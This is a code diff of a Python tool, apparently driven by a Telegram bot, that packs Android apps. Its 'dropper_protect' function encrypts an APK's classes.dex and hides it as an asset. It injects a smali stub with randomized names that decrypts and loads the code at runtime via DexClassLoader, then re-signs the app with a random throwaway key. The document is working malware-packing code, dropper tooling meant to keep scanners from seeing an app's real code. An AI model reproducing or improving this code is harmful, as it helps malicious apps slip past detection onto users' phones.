@@ -32,27 +32,60 @@ def run_cmd(cmd, timeout=300):
         logger.error("Command timed out")
         return False
 
-def random_string(length=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+def random_letter_string(length=6):
+    """Generate a random string that starts with a lowercase letter, rest alphanumeric."""
+    first = random.choice(string.ascii_lowercase)
+    rest = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1))
+    return first + rest
+
+def random_class_name():
+    """Class name must start with uppercase letter, rest alphanumeric."""
+    first = random.choice(string.ascii_uppercase)
+    rest = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2,3)))
+    return first + rest
 
 def generate_stub(package_name: str, main_activity: str, app_class: str = ""):
-    """
-    Generates randomized smali code for the loader.
-    Returns (app_smali, util_smali) strings.
-    """
-    # Random stub package & classes
-    pkg = "com." + random_string(6) + "." + random_string(6)
-    app_cls = random_string(3).capitalize()  # e.g., 'Aab'
-    util_cls = random_string(3).capitalize()
-    key_asset = random_string(8) + ".txt"
-    dex_asset = random_string(8) + ".dex"
+    # Random package, classes, asset names
+    pkg = "com." + random_letter_string(6) + "." + random_letter_string(6)
+    app_cls = random_class_name()   # e.g., 'Abc'
+    util_cls = random_class_name()  # e.g., 'Def'
+    key_asset = random_letter_string(8) + ".txt"
+    dex_asset = random_letter_string(8) + ".dex"
 
-    # StubApp.smali
+    # Build smali for Application class
+    # Note: Use {app_class} if provided, else start launcher activity.
+    loader_code = ""
+    if app_class:
+        loader_code = f"""
+    const-string v7, "{app_class}"
+    invoke-virtual {{v6, v7}}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v7
+    invoke-virtual {{v7}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
+    move-result-object v7
+    check-cast v7, Landroid/app/Application;
+    const-class v8, Landroid/app/Application;
+    const-string v9, "mBase"
+    invoke-virtual {{v8, v9}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v8
+    const/4 v9, 0x1
+    invoke-virtual {{v8, v9}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getBaseContext()Landroid/content/Context;
+    move-result-object v9
+    invoke-virtual {{v8, v7, v9}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+    invoke-virtual {{v7}}, Landroid/app/Application;->onCreate()V
+"""
+    else:
+        loader_code = f"""
+    const-string v7, "{package_name}"
+    const-string v8, "{main_activity}"
+    invoke-static {{p0, v7, v8}}, L{pkg}/{util_cls};->startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
+"""
+
     app_smali = f""".class public L{pkg}/{app_cls};
 .super Landroid/app/Application;
 
 .method public onCreate()V
-    .registers 8
+    .registers 11
     .prologue
     :try_start
     invoke-virtual {{p0}}, L{pkg}/{app_cls};->getApplicationContext()Landroid/content/Context;
@@ -112,45 +145,17 @@ def generate_stub(package_name: str, main_activity: str, app_class: str = ""):
     invoke-virtual {{p0}}, L{pkg}/{app_cls};->getClassLoader()Ljava/lang/ClassLoader;
     move-result-object v10
     invoke-direct/range {{v6 .. v10}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
-"""
-    # If app_class is provided (original application class), we load and call it
-    if app_class:
-        app_smali += f"""
-    const-string v7, "{app_class}"
-    invoke-virtual {{v6, v7}}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
-    move-result-object v7
-    invoke-virtual {{v7}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
-    move-result-object v7
-    check-cast v7, Landroid/app/Application;
-    const-class v8, Landroid/app/Application;
-    const-string v9, "mBase"
-    invoke-virtual {{v8, v9}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-    move-result-object v8
-    const/4 v9, 0x1
-    invoke-virtual {{v8, v9}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
-    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getBaseContext()Landroid/content/Context;
-    move-result-object v9
-    invoke-virtual {{v8, v7, v9}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
-    invoke-virtual {{v7}}, Landroid/app/Application;->onCreate()V
-"""
-    else:
-        # No Application class, start launcher activity
-        app_smali += f"""
-    const-string v7, "{package_name}"
-    const-string v8, "{main_activity}"
-    invoke-static {{p0, v7, v8}}, L{pkg}/{util_cls};->startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
-"""
-    app_smali += """
+{loader_code}
     :try_end
-    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
+    .catch Ljava/lang/Exception; {{:try_start .. :try_end}} :catch_0
     return-void
     :catch_0
     move-exception v0
-    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+    invoke-virtual {{v0}}, Ljava/lang/Exception;->printStackTrace()V
     return-void
 .end method
 """
-    # Util.smali
+
     util_smali = f""".class public L{pkg}/{util_cls};
 .super Ljava/lang/Object;
 
@@ -212,6 +217,7 @@ def generate_stub(package_name: str, main_activity: str, app_class: str = ""):
     return-void
 .end method
 """
+
     return app_smali, util_smali, key_asset, dex_asset, pkg, app_cls
 
 def dropper_protect(input_apk: str, output_apk: str) -> bool:
@@ -219,7 +225,7 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
     dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
     rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
     aligned = os.path.join(TEMP_DIR, 'aligned.apk')
-    encrypted_apk = os.path.join(TEMP_DIR, 'payload.enc')
+    encrypted_dex = os.path.join(TEMP_DIR, 'payload.enc')
     ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
 
     if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
@@ -227,66 +233,61 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
 
     try:
         manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
-        # Parse original manifest for package, main activity, application class
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
-        package_name = re.search(r'package="([^"]+)"', manifest).group(1)
 
-        # Find main activity
+        package_name = re.search(r'package="([^"]+)"', manifest).group(1)
         main_activity = None
         app_class = None
-        # Get application class if any
+
+        # Find Application class
         app_match = re.search(r'<application[^>]*android:name="([^"]*)"', manifest)
         if app_match:
             app_class = app_match.group(1)
             if app_class.startswith('.'):
                 app_class = package_name + app_class
-        # Find launcher activity
-        # Simple search for action MAIN / category LAUNCHER
+
+        # Find main activity (launcher)
         launcher_re = re.search(r'<activity[^>]*>.*?<action android:name="android\.intent\.action\.MAIN".*?>.*?</activity>', manifest, re.DOTALL)
         if launcher_re:
-            activity_block = launcher_re.group(0)
-            act_name = re.search(r'android:name="([^"]+)"', activity_block)
+            act_block = launcher_re.group(0)
+            act_name = re.search(r'android:name="([^"]+)"', act_block)
             if act_name:
                 main_activity = act_name.group(1)
                 if main_activity.startswith('.'):
                     main_activity = package_name + main_activity
         if not main_activity:
-            # Fallback: first activity
-            act_search = re.search(r'<activity[^>]*android:name="([^"]+)"', manifest)
-            if act_search:
-                main_activity = act_search.group(1)
+            # fallback: first activity
+            first_act = re.search(r'<activity[^>]*android:name="([^"]+)"', manifest)
+            if first_act:
+                main_activity = first_act.group(1)
                 if main_activity.startswith('.'):
                     main_activity = package_name + main_activity
         if not main_activity:
             logger.error("Cannot determine main activity")
             return False
 
-        # Encrypt original classes.dex only (not whole APK) for faster operation
-        # Extract classes.dex from original APK
-        import zipfile, io
+        # Encrypt classes.dex
+        import zipfile
         with zipfile.ZipFile(input_apk, 'r') as zf:
             dex_data = zf.read('classes.dex')
         key = os.urandom(16)
         key_hex = base64.b16encode(key).decode().lower()
-        # Encrypt dex file
-        enc_dex = os.path.join(TEMP_DIR, 'enc_dex.bin')
-        with open(enc_dex, 'wb') as f:
+        dex_path = os.path.join(TEMP_DIR, 'classes.dex')
+        with open(dex_path, 'wb') as f:
             f.write(dex_data)
-        # Use openssl
-        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', enc_dex, '-out', encrypted_apk], timeout=60):
+        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', dex_path, '-out', encrypted_dex], timeout=60):
             return False
-        # Now encrypted_apk is actually encrypted dex
 
-        # Generate stub smali
-        stub_app, stub_util, key_asset, dex_asset, stub_pkg, app_cls = generate_stub(
+        # Generate stub with safe names
+        stub_app, stub_util, key_asset, dex_asset, stub_pkg, stub_app_cls = generate_stub(
             package_name, main_activity, app_class if app_class else ""
         )
 
         # Assets
         assets_dir = os.path.join(dec_dir, 'assets')
         os.makedirs(assets_dir, exist_ok=True)
-        shutil.copy(encrypted_apk, os.path.join(assets_dir, dex_asset))
+        shutil.copy(encrypted_dex, os.path.join(assets_dir, dex_asset))
         with open(os.path.join(assets_dir, key_asset), 'w') as f:
             f.write(key_hex)
 
@@ -295,22 +296,23 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
             if item.startswith('smali'):
                 shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
 
-        # Create new smali with stub package
-        stub_dir = os.path.join(dec_dir, 'smali', *stub_pkg.split('.')[1:])  # com.a.b -> a/b
+        # Create stub smali directories (convert package to path)
+        pkg_path = stub_pkg.replace('.', '/')[1:] if stub_pkg.startswith('.') else stub_pkg.replace('.', '/')
+        stub_dir = os.path.join(dec_dir, 'smali', pkg_path)
         os.makedirs(stub_dir, exist_ok=True)
-        with open(os.path.join(stub_dir, app_cls + '.smali'), 'w') as f:
+        with open(os.path.join(stub_dir, stub_app_cls + '.smali'), 'w') as f:
             f.write(stub_app)
-        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:  # We'll keep Util name as it's called from StubApp, but it's inside random package so fine
+        util_cls = re.search(r'\.class public L[^/]+/([^;]+);', stub_util).group(1)
+        with open(os.path.join(stub_dir, util_cls + '.smali'), 'w') as f:
             f.write(stub_util)
 
-        # Modify manifest: set Application class to stub
+        # Modify manifest
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
         # Remove any existing android:name from application
         manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
-        # Add our stub
-        manifest = manifest.replace('<application', f'<application android:name="{stub_pkg}.{app_cls}"')
-        # No FileProvider needed now
+        # Add our stub application
+        manifest = manifest.replace('<application', f'<application android:name="{stub_pkg}.{stub_app_cls}"')
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(manifest)
 
@@ -319,9 +321,9 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
             return False
 
-        ks_pass = random_string(12)
-        alias = random_string(6)
-        dname = f"CN={random_string(5)}, OU={random_string(4)}, O={random_string(5)}, L={random_string(6)}, ST={random_string(4)}, C={random.choice(['US','GB','IN'])}"
+        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        alias = ''.join(random.choices(string.ascii_letters, k=6))
+        dname = f"CN={''.join(random.choices(string.ascii_letters, k=5))}, OU=Dev, O=Org, L=Loc, ST=ST, C={random.choice(['US','GB','IN'])}"
         if not run_cmd(['keytool', '-genkey', '-v', '-keystore', ks_path, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '365', '-storepass', ks_pass, '-keypass', ks_pass, '-dname', dname], timeout=30):
             return False
         if not run_cmd(['apksigner', 'sign', '--ks', ks_path, '--ks-pass', f'pass:{ks_pass}', '--ks-key-alias', alias, '--out', output_apk, aligned], timeout=30):
@@ -333,11 +335,12 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         return False
     finally:
         shutil.rmtree(dec_dir, ignore_errors=True)
-        for f in [encrypted_apk, rebuilt, aligned, ks_path]:
+        for f in [encrypted_dex, rebuilt, aligned, ks_path]:
             try: os.remove(f)
             except: pass
+        try: os.remove(dex_path)
+        except: pass
 
-# Telegram handlers (same as before)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_allowed(update.effective_user.id):
         await update.message.reply_text("Access denied.")
